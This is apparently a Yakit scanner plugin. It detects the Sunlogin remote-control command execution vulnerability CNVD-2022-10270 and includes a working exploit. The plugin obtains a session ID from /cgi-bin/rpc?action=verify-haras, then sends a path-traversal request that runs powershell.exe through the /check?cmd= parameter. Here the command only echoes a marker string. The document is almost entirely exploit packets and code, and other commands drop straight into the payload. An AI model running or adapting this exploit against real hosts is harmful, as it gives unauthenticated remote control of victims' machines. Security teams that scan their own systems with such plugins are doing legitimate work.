# port scan plugin
log.setLevel("info")
yakit.AutoInitYakit()

handleCheck1 = func(target, port){
    addr1 = str.HostPort(target, port)
    isTls1 = str.IsTLSServer(addr1)

    packet1 = `
GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0

`

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr1}),
    poc.https(isTls1),
    poc.redirectTimes(0),
    )
    _, body = poc.Split([]byte(rsp))
    rsp_id = json.loads(body)["verify_string"]
    // println(id)
    return rsp_id
    if !str.MatchAllOfSubString(rsp, "HTTP/1.1 200") && !str.MatchAllOfRegexp(rsp, `enabled`){
        return
    }

}

handleCheck = func(target,port,rsp_id){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET /check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+echo+f47c10c5b6057f617f95f12940869972 HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: CID={{params(rsp_id)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr, "rsp_id":rsp_id}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(string(rsp))
    if len(rsp) > 0 {
        // println(string(rsp))
        if str.MatchAllOfSubString(rsp, `f47c10c5b6057f617f95f12940869972`) && str.MatchAllOfSubString(rsp, `HTTP/1.1 200`){
            yakit.Info("%v 向日葵远程控制软件 CNVD-2022-10270 命令执行漏洞", addr)
            risk.NewRisk(
            addr,risk.title("向日葵远程控制软件 CNVD-2022-10270 命令执行漏洞"),
            risk.severity("high"),
            risk.titleVerbose("向日葵远程控制软件 CNVD-2022-10270 命令执行漏洞存在"),
            risk.type("RCE[向日葵远程控制软件]"),
            risk.request(string(req)),
            risk.solution("厂商已发布了漏洞修复程序，请及时关注更新：https://sunlogin.oray.com/"),
            risk.description("向日葵是一款免费的，集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。上海贝锐信息科技股份有限公司向日葵个人版for Windows存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权。"),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在向日葵远程控制软件 CNVD-2022-10270 命令执行漏洞")
            }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        rsp_id=handleCheck1(result.Target,result.Port)
        if rsp_id==nil{
            return
        }
        handleCheck(result.Target,result.Port,rsp_id)
    }
    
}
